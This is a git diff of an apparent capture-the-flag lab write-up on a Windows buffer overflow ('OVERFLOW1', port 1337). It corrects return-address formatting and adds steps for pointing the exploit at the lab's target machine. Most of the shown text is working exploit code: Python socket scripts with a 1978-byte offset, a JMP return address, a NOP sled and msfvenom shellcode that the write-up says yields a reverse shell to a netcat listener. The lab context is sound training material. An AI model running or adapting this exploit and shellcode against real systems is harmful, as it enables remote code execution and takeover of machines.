@@ -441,9 +441,9 @@ payload = "\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\
                 
                 - Reversed pair: `AF 11 50 62`
                 
-                - Final Result: `/xAF/x11/x50/x62` 
+                - Final Result: `"\xAF\x11\x50\x62"` 
             
-            - **`retn` = `/xAF/x11/x50/x62`**     
+            - **`retn` = `"\xAF\x11\x50\x62"`**     
 
 ```python
 import socket
@@ -454,7 +454,7 @@ port = 1337
 prefix = "OVERFLOW1 "
 offset = 1978
 overflow = "A" * offset
-retn = "/xAF/x11/x50/x62"
+retn = "\xAF\x11\x50\x62"
 padding = ""
 payload = ""
 postfix = ""
@@ -495,7 +495,7 @@ port = 1337
 prefix = "OVERFLOW1 "
 offset = 0
 overflow = "A" * offset
-retn = "/xAF/x11/x50/x62"
+retn = "\xAF\x11\x50\x62"
 padding = ""
 payload = ("\xdb\xcc\xbe\x9d\xa2\x9d\xe7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
 "\x52\x83\xc2\x04\x31\x72\x13\x03\xef\xb1\x7f\x12\xf3\x5e\xfd"
@@ -557,7 +557,7 @@ port = 1337
 prefix = "OVERFLOW1 "
 offset = 1978
 overflow = "A" * offset
-retn = "/xAF/x11/x50/x62"
+retn = "\xAF\x11\x50\x62"
 padding = "\x90" * 16
 payload = ("\xdb\xcc\xbe\x9d\xa2\x9d\xe7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
 "\x52\x83\xc2\x04\x31\x72\x13\x03\xef\xb1\x7f\x12\xf3\x5e\xfd"
@@ -621,7 +621,7 @@ port = 1337
 prefix = "OVERFLOW1 "
 offset = 1978
 overflow = "A" * offset
-retn = "/xAF/x11/x50/x62"
+retn = "\xAF\x11\x50\x62"
 padding = "\x90" * 16
 payload = ("\xdb\xcc\xbe\x9d\xa2\x9d\xe7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
 "\x52\x83\xc2\x04\x31\x72\x13\x03\xef\xb1\x7f\x12\xf3\x5e\xfd"
@@ -645,7 +645,7 @@ payload = ("\xdb\xcc\xbe\x9d\xa2\x9d\xe7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
 "\xf9\xb7\x63\x7b\xac\x61\xdd\x3d\x06\xc0\xb7\x97\xf5\x8a\x5f"
 "\x61\x36\x0d\x19\x6e\x13\xfb\xc5\xdf\xca\xba\xfa\xd0\x9a\x4a"
 "\x83\x0c\x3b\xb4\x5e\x95\x5b\x57\x4a\xe0\xf3\xce\x1f\x49\x9e"
-b"\xf0\xca\x8e\xa7\x72\xfe\x6e\x5c\x6a\x8b\x6b\x18\x2c\x60\x06"
+"\xf0\xca\x8e\xa7\x72\xfe\x6e\x5c\x6a\x8b\x6b\x18\x2c\x60\x06"
 "\x31\xd9\x86\xb5\x32\xc8")
 postfix = ""
 
@@ -680,7 +680,18 @@ except:
 
         - **Your netcat listener should catch a reverse shell!**
         
-            -  
+            - ![image](https://user-images.githubusercontent.com/94720207/169681296-145d3592-3b28-4929-8dfe-14a94911bae5.png)
+
+---
+
+### Attacking the real OSCP Server
+
+- This final step is very easy, we only need to point agains the `Real OSCP Server` instead my bare metal Windows 10 PC.
+
+    - To do that, we only need to change the payload from `msfvenom` with another LHOST & LPORT poining my THM-VPN (instead my local  192.168.1.100/24) 
+    
+    - Also change the python script to pint the RHOST & RPORT of the OSCP Server (THM machine) 
+    - 
 
 ---
 
